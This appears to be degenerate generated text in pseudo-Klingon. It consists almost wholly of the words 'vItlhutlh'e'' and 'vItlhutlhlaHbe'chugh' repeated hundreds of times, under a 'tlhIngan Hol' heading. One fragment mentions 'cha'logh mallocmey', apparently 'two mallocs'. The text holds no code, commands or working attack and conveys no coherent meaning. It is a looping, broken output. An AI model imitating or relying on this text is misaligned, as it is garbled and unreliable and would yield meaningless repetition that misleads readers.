vaj vaj 'e' fb DaH 'e' vItlhutlh'e' 'e' GOT, 'e' vItlhutlh'e' 'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh'e' vItlhutlh
**tlhIngan Hol:**

Dochvam'e' ghaH 'ej cha'logh mallocmey, vaj vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhla
